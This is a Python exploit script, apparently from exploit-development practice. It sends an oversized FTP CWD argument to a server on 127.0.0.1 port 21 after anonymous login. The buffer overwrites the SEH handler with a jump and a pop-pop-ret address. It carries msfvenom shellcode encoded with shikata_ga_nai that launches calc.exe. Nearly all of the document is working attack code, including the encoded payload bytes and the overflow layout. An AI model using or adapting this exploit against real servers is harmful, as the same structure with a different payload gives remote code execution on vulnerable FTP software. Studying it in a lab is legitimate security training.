import socket

s = socket.socket()
#msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -b "\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
#Payload size: 274 bytes
#Final size of python file: 1349 bytes
# 계산기 실행 코드
buf =  b""
buf += b"\xba\xe1\xe1\x19\x5e\xd9\xf7\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x3e\x31\x50\x15\x83\xc0\x04\x03\x50\x11\xe2"
buf += b"\x14\x5b\xb4\x33\xf8\x10\x1c\x0e\xdd\x5d\x87\x65\x80"
buf += b"\xae\x0e\x34\x02\xe0\xc5\x25\x71\x57\xf4\xca\x35\xc6"
buf += b"\x34\xb5\xf6\x41\x0c\xb0\xaf\x4b\x3e\x71\x62\xb3\x7b"
buf += b"\xac\x1e\xa2\x0e\xc9\xd9\x35\x67\x62\xb2\xf3\x05\x89"
buf += b"\xc5\x05\x16\xe6\x16\xad\x9d\xf5\xc5\x30\xd6\x8b\x93"
buf += b"\xd5\x0c\x0f\x84\xc0\x33\x06\x1e\xd6\xfc\x9c\xcc\x07"
buf += b"\xc5\xfc\xab\x6d\x9e\x28\xaa\x5f\xfb\x4a\xc1\x38\x07"
buf += b"\xc1\xd5\x40\xfe\x63\x2d\x2b\x07\xdb\xa6\x03\x45\xe2"
buf += b"\x5f\x49\xb0\x1f\xbe\x5f\xc1\xe2\x13\xef\x1e\x49\xcd"
buf += b"\x77\x5b\x95\x0b\xf4\x9f\x71\xae\x41\x99\x75\x82\xe6"
buf += b"\xc5\x76\x64\xa2\x4f\x81\x05\xef\xe9\x39\xef\x47\x7a"
buf += b"\x51\x1b\xef\xdb\x3c\x94\x08\x52\x4c\x9e\xe5\xed\xc9"
buf += b"\x36\xd1\x8c\xde\xe2\xac\x73\xaa\xd2\x77\x39\xd9\xca"
buf += b"\xb3\x58\x7f\xdb\x0e\xaa\x31\x98\x02\x85\xa7\x53\xd1"
buf += b"\x69\x80\x8b\xcf\x1f\x20\x16\x30\xee\x9e\xfc\x7a\x31"
buf += b"\xa2\x11\x22\xdd\x80\xd3\xd5\x8d\x88\xbb\x3e\xe3\x99"
buf += b"\xda\xb9\xd9\x90\xde\x55\x55\x2e\x2c\x1c\xa1\x30\x1e"
buf += b"\xc6\xb4\x53\x74\x80\xe5\x15\xbb\x6e\xe4\xd2\xb3\xb7"
buf += b"\x40\x8a\xc5\x96\x11\x69\xf0\x60\x43\xff\x4d\xa3\x94"
buf += b"\x4d"

#nSEH = "\xEB\x13\x90\x90"
#SEH = "\x9D\x6D\x20\x12" >> 12206D9D
buffer = b"\x41" * 1037 + b"\xeb\x0a\x90\x90" + b"\x9D\x6D\x20\x12" + b"\x90" *30 +  buf +  b"D"*1955 
#buffer = "\x41" * 1060
print("\sending evil buffer....")
s.connect(('127.0.0.1',21)) #HARDCODED IP ADDRESS.
data = s.recv(1024)
s.send(b'USER anonymous' + b'\r\n')
data = s.recv(1024)
s.send(b'PASS anonymous' + b'\r\n')
data = s.recv(1024)
s.send(b'CWD ' + buffer + b'\r\n') # Change Work Directory
s.close()